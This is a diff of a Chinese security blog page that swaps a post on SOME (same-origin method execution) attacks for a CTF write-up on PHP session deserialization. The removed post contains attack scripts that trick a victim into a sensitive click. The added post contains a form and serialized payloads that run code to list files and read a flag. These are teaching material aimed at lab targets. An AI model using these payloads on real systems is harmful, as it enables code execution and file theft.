@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web安全,">
+  <meta name="keywords" content="php,ctf,">
 
 
 
@@ -79,18 +79,23 @@
 
 
 
-<meta name="description" content="本文主要介绍怎样利用Some执行敏感操作">
-<meta name="keywords" content="Web安全">
+<meta name="description" content="php相关的反序列化漏洞">
+<meta name="keywords" content="php,ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Some攻击方式的探究">
-<meta property="og:url" content="https://hxtch.github.io/2018/04/10/2018-04-10-Some/index.html">
+<meta property="og:title" content="一道反序列化ctf">
+<meta property="og:url" content="https://hxtch.github.io/2017/05/16/2017-10-20-一道反序列化ctf/index.html">
 <meta property="og:site_name" content="palm">
-<meta property="og:description" content="本文主要介绍怎样利用Some执行敏感操作">
+<meta property="og:description" content="php相关的反序列化漏洞">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-13T14:30:30.334Z">
+<meta property="og:image" content="https://i.loli.net/2018/03/09/5aa29e626db19.png">
+<meta property="og:image" content="https://i.loli.net/2018/03/09/5aa29e62a617f.png">
+<meta property="og:image" content="https://i.loli.net/2018/03/09/5aa29e626edff.png">
+<meta property="og:image" content="https://i.loli.net/2018/03/09/5aa29e62a6418.png">
+<meta property="og:updated_time" content="2018-11-13T14:27:27.474Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Some攻击方式的探究">
-<meta name="twitter:description" content="本文主要介绍怎样利用Some执行敏感操作">
+<meta name="twitter:title" content="一道反序列化ctf">
+<meta name="twitter:description" content="php相关的反序列化漏洞">
+<meta name="twitter:image" content="https://i.loli.net/2018/03/09/5aa29e626db19.png">
 
 
 
@@ -120,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="https://hxtch.github.io/2018/04/10/2018-04-10-Some/">
+  <link rel="canonical" href="https://hxtch.github.io/2017/05/16/2017-10-20-一道反序列化ctf/">
 
 
 
 
 
-  <title>Some攻击方式的探究 | palm</title>
+  <title>一道反序列化ctf | palm</title>
   
 
 
@@ -253,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hxtch.github.io/2018/04/10/2018-04-10-Some/">
+    <link itemprop="mainEntityOfPage" href="https://hxtch.github.io/2017/05/16/2017-10-20-一道反序列化ctf/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="palm">
@@ -270,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Some攻击方式的探究</h1>
+          <h1 class="post-title" itemprop="name headline">一道反序列化ctf</h1>
         
 
         <div class="post-meta">
@@ -282,8 +287,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-10T00:00:00+08:00">
-                2018-04-10
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-16T00:00:00+08:00">
+                2017-05-16
               </time>
             
 
@@ -329,7 +334,7 @@
 
           
               <div class="post-description">
-                  本文主要介绍怎样利用Some执行敏感操作
+                  php相关的反序列化漏洞
               </div>
           
 
@@ -346,38 +351,49 @@
       
 
       
-        <h2 id="Some攻击方式的探究"><a href="#Some攻击方式的探究" class="headerlink" title="Some攻击方式的探究"></a>Some攻击方式的探究</h2><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍:"></a>0x01 介绍:</h2><p>Some (Same origin method execution) ，也就是同源方法执行。受同源策略的影响，一个域想要向另一个域传递消息，需要使用JSONP，或者Postmessage，CORS。而some攻击其实就是利用了回调函数的参数值可以由用户控制，从而可以对整个域的dom文档进行操作。</p>
-<p></p><h4>JSONP</h4><p></p>
+        <h2 id="0x01背景"><a href="#0x01背景" class="headerlink" title="0x01背景:"></a>0x01背景:</h2><ul>
+<li><p><strong>题目地址:<br><a href="http://web.jarvisoj.com:32784" target="_blank" rel="noopener">http://web.jarvisoj.com:32784</a></strong></p>
+</li>
+<li><p>题目代码:</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;index.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先将session.serialize_handler设为php<br>官方文档中对session.serialize_handler和ini_set()的解释是这样的</p>
 <blockquote>
-<p>jsonp 由于同源策略的存在，两个域之间无法正常沟通，但是<code>&lt;script&gt;</code>标签不受这个限制，所以我们就就可以利用script这个标签，来抓取别的页面动态产生的json数据，这种抓取的方式就是JSONP。</p>
+<p><strong>session.serialize_handler</strong> 定义用来序列化／解序列化的处理器名字。 当前支持 PHP 序列化格式 (名为 php_serialize)、 PHP PHP 内部格式 (名为 php 及 php_binary) 和 WDDX (名为 wddx)。  自 PHP 5.5.4 起可以使用 php_serialize。 php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并且不会有 php 和 php_binary 所具有的限制。 使用较旧的序列化处理器导致 $_SESSION 的索引既不能是数字也不能包含特殊字符(| and !) 。 使用 php_serialize 避免脚本退出时，数字及特殊字符索引导致出错。 默认使用 php。</p>
 </blockquote>
-<p>JSONP的实现过程中会存在一个客户端与服务端，<br>客户端包含对数据进行处理的函数，并且使用script标签向服务端请求它要处理的数据。<br>假如我们的请求办法是<code>&lt;script type=&quot;text/javascript&quot; src=&quot;yemian/server.php?callback=&quot;&gt;</code>,其中callback的值即就是处理数据的函数名，<br>然后服务端server.php接受到函数名之后，会对其添加相应的数据并返回给客户端，比如函数名是callback，然后返回给客户端callback({‘xiaoming’,123})，相当于给json数据添加了前缀和后缀，所以称为json with padding。</p>
-<h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02:利用："></a>0x02:利用：</h2><p>有时候一个参数会过滤导致xss的关键字符，只留下\w+., 这时我们便可以考虑这个参数会不会是被执行的回调函数。假设在主页面<code>www.test.com</code>上存在一个1.html</p>
-<p> 代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">&lt;button onclick=&quot;secret()&quot; &gt;private operation&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function secret() &#123;</span><br><span class="line">		alert(&apos;secret&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>服务端存在一个执行回调函数的部分来完成相应的功能jsonp.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$callback = $_GET[&apos;callback&apos;];</span><br><span class="line">echo &quot;&lt;script&gt;&quot;.$callback.&quot;()&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这时我们可以在vps构造两个攻击脚本</p>
-<ol>
-<li>some1.html，使漏洞页面的父窗口为存在敏感操作的页面</li>
-<li>some2.html的作用即是使用window.opener操作父窗口</li>
-</ol>
-<p>some1.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	window.open(&apos;some2.html&apos;);</span><br><span class="line">	location.replace(&apos;http://www.test.com/1.html&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>some2.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	location.replace(&apos;http://www.test.com/jsonp.php?callback=window.opener.body.firstElementChild.firstElementChild.click&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后我们诱骗别人点开vps/some1.html， 即可在他不知情的情况下执行敏感操作。</p>
+<blockquote>
+<p><strong>ini_set()</strong>:设置指定配置选项的值，这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p>
+</blockquote>
 <ul>
-<li>一个some 漏洞平台 <a href="https://www.someattack.com/Playground/" target="_blank" rel="noopener">https://www.someattack.com/Playground/</a></li>
+<li>也就是说PHP内置了多种处理器用于存储$_SESSION数据时对数据进行序列化和反序列化，而session.serialize_handler的作用就是规定使用哪一个处理器。<br>根据ini_set()的说明来看, 脚本内部设置的序列化处理器只在脚本运行时才会有作用，运行结束后会自动恢复原始值，也就是php.ini中设置的值。如果脚本中设置的序列化处理器和php.ini中设置的序列化处理器不同，就会出现安全问题。</li>
 </ul>
-<h2 id="0x03-局限："><a href="#0x03-局限：" class="headerlink" title="0x03: 局限："></a>0x03: 局限：</h2><p>我们提交的callback值必须是可执行的js，并且我们没办法控制服务他回调函数要处理的参数，如果服务端为其添加了数据参数，可能会导致同源方法无法执行。</p>
-<p>此外，如果服务端返回头的Content-Type值为application/json, callback值便不能被当作js处理，攻击便会失效。<br>我们为上面的jsonp.php 添加</p>
-<p><code>header(&quot;Content-Type: application/json&quot;);</code></p>
-<p>页面不再弹窗, 攻击失效</p>
-<h2 id="0x04-防御："><a href="#0x04-防御：" class="headerlink" title="0x04: 防御："></a>0x04: 防御：</h2><p>some攻击本质上就是对回调函数参数的滥用，所以防御可以从一下几方面</p>
+<p>比如，我们提交php_serialize类型的session数据<br><code>$_SESSION[&#39;ryat] = &#39;|O:8:&quot;stdClass&quot;:O:{}&#39;</code></p>
 <ul>
-<li>保证回调函数参数提交的值在白名单范围内</li>
-<li>或者使用Postmessage来进行跨域交互。</li>
-<li>让Content-Type的值为application/json</li>
+<li><p><strong>php_serialize处理器允许字符串变量中出现’|’字符。</strong><br>所以SESSION数据存储的时候经过php_serialize处理器解析变为<br>a:1:{s:4:”ryat”;”s:20:”|O:8:”stdClass”:O:{}”</p>
+</li>
+<li><p><strong>php序列化处理器规定’|’前出现的为键，之后出现的为值</strong><br>所以存储的数据读取时变成了<br>array(1) {<br>  [“a:1:{s:4:”ryat”;”s:20:””]==&gt;object(stdClass)#1 (0){}<br>  }<br>可以看到，我们通过注入|字符伪造了对象的序列化数据，然后成功实例化了stdClass对象</p>
+</li>
 </ul>
-<h2 id="0x05-参考："><a href="#0x05-参考：" class="headerlink" title="0x05: 参考："></a>0x05: 参考：</h2><p><a href="http://blog.safedog.cn/?p=13" target="_blank" rel="noopener">http://blog.safedog.cn/?p=13</a><br><a href="https://paper.seebug.org/452/" target="_blank" rel="noopener">https://paper.seebug.org/452/</a><br><a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0215221" target="_blank" rel="noopener">http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0215221</a><br><a href="http://www.benhayak.com/2015/06/same-origin-method-execution-some.html" target="_blank" rel="noopener">http://www.benhayak.com/2015/06/same-origin-method-execution-some.html</a><br><a href="http://zoczus.blogspot.fr/2015/04/plupload-same-origin-method-execution.html" target="_blank" rel="noopener">http://zoczus.blogspot.fr/2015/04/plupload-same-origin-method-execution.html</a></p>
+<hr>
+<h2 id="0x02-具体实现："><a href="#0x02-具体实现：" class="headerlink" title="0x02 具体实现："></a>0x02 具体实现：</h2><p>我们随便提交个数据可获取当前的phpinfo(), 其中session.serialize_handler的值如下图所示，其中本地变量是php，主变量是php_serialize，所以存储session数据时用php序列化处理器，读取时使用php_serialize序列化处理器。<br>所以这道题的大致思路就是我们提交一个包含|字符的字符串,然后php序列化处理器存储它,并实例化了对象.<br><img src="https://i.loli.net/2018/03/09/5aa29e626db19.png" alt=""></p>
+<ul>
+<li>同时我们可以发现session.upload_progress.enabled是打开的，当这个选项打开时，php会自动记录上传文件的进度，同时其信息保存在$_SESSION中</li>
+</ul>
+<p>所以我们可以在本地构造一个指向目标页面的表单,上传变量.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;post&quot;  enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后抓包修改filename的值来提交$SESSION</p>
+<ul>
+<li>接下来我们要读取当前目录的所有文件,从phpinfo()中可以看到,执行系统命令的相关函数被禁止,所以在这里我们使用scandir()函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">//or session.serialize_handler set to php in php.ini </span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class OowoO </span><br><span class="line">&#123;</span><br><span class="line">	public $mdzz = &quot;print_r(scandir(dirname(__FILE__)));&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new OowoO();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>执行得到<br><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></p>
+<p>然后抓包修改filename<br><img src="https://i.loli.net/2018/03/09/5aa29e62a617f.png" alt=""><br>得到敏感文件</p>
+<p>我们可以在phpinfo()中发现脚本文件的所在目录<br><img src="https://i.loli.net/2018/03/09/5aa29e626edff.png" alt=""></p>
+<p>然后我们读取敏感文件,将之前的$mdzz修改一下,得到如下的payload</p>
+<p><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:86:&quot;print(file_get_contents(&#39;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));&quot;;}</code></p>
+<p>传到filename中</p>
+<p><img src="https://i.loli.net/2018/03/09/5aa29e62a6418.png" alt=""></p>
+<p>得到flag</p>
 
       
     </div>
@@ -395,7 +411,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
           
         </div>
       
@@ -408,15 +426,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/16/2017-05-16-mysql下基于字符集的注入/" rel="next" title="mysql下基于字符集的注入">
-                <i class="fa fa-chevron-left"></i> mysql下基于字符集的注入
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/16/2017-05-16-mysql下基于字符集的注入/" rel="prev" title="mysql下基于字符集的注入">
+                mysql下基于字符集的注入 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -548,7 +566,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Some攻击方式的探究"><span class="nav-number">1.</span> <span class="nav-text">Some攻击方式的探究</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-介绍"><span class="nav-number">2.</span> <span class="nav-text">0x01 介绍:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#undefined"><span class="nav-number">2.0.1.</span> <span class="nav-text">JSONP</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-利用："><span class="nav-number">3.</span> <span class="nav-text">0x02:利用：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-局限："><span class="nav-number">4.</span> <span class="nav-text">0x03: 局限：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-防御："><span class="nav-number">5.</span> <span class="nav-text">0x04: 防御：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考："><span class="nav-number">6.</span> <span class="nav-text">0x05: 参考：</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01背景"><span class="nav-number">1.</span> <span class="nav-text">0x01背景:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-具体实现："><span class="nav-number">2.</span> <span class="nav-text">0x02 具体实现：</span></a></li></ol></div>
             
 
           </div>
